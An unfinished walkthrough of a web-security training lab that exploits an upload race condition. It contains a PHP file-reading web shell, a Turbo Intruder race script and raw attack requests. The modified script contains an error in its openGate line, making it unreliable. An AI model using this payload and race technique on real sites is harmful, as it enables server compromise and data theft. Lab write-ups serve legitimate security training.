# Lab: Web shell upload via race condition

## Description

 This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

## Hint

 The vulnerable code that introduces this race condition is as follows: 
 
 ```php
 <?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}

function checkViruses($fileName) {
    // checking for viruses
    ...
}

function checkFileType($fileName) {
    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
    if($imageFileType != "jpg" && $imageFileType != "png") {
        echo "Sorry, only JPG & PNG files are allowed\n";
        return false;
    } else {
        return true;
    }
}
?>
 ```
 
 # Step 1 Source Code review
 
 Since we have access to the source code for this lab, I should review first to get an idea of what is happening. I can see that my uploaded file is first moved to a temp directory, then checked for filetype and if it has "viruses". From viewing this it may be possible to access my file from within the temp directory, before the server finishes the validation checks and deletes it.
 
 # Step 2 Upload get_secret.php and execute before validation completes
 
 
 Contents of get_secret.php
 ```php
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 But when uploading it I get this error:
 
 ![image](https://user-images.githubusercontent.com/83407557/171276226-ade47fed-7433-46a8-8789-6656e4b12e28.png)

# Step 3 Create a turbo intruder attack

I send that failed post request to burp intruder and check out the [documentation](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py)

![image](https://user-images.githubusercontent.com/83407557/171276482-470dd853-4aeb-4250-b058-ee984c9ae213.png)

I take a look at the code example for race conditions

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

```
## Modifying the code

Looking at the example, I want to change a few things. First I don't want it to do 30 POST requests, I want 1 POST request for my file, and then 30 get requests for the race condition. First I will write the code with place holders then get the two requests and modify them into the script.


I will replace this python code
```python
 # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')

```

With this one containing variable placeholders

```python

    post_req = '''placeholder'''

    get_req = '''placeholder'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(post_req, gate='race1')
    for x in range(30):
        engine.queue(get_req, gate='race1')
        engine.openGate='race1'
```

now I need to get the POST request from my proxy history

```
POST /my-account/avatar HTTP/1.1
Host: acd11fef1e18a8abc0672d1400d400a6.web-security-academy.net
Cookie: session=hSVrEyCK3amLHtv1GtLohmt2rfO30rNF
Content-Length: 473
Cache-Control: max-age=0
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://acd11fef1e18a8abc0672d1400d400a6.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RU4sTTBWwQ6yNnY
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://acd11fef1e18a8abc0672d1400d400a6.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary3RU4sTTBWwQ6yNnY
Content-Disposition: form-data; name="avatar"; filename="get_secret.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

------WebKitFormBoundary3RU4sTTBWwQ6yNnY
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary3RU4sTTBWwQ6yNnY
Content-Disposition: form-data; name="csrf"

AeNj0jwzMKHX2x6HMNFfbxdIEip6p9ad
------WebKitFormBoundary3RU4sTTBWwQ6yNnY--

```

And then my get request 

```
GET /files/avatars/get_secret.php HTTP/1.1
Host: acd11fef1e18a8abc0672d1400d400a6.web-security-academy.net
Cookie: session=hSVrEyCK3amLHtv1GtLohmt2rfO30rNF
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

### Putting the code together
 needs work
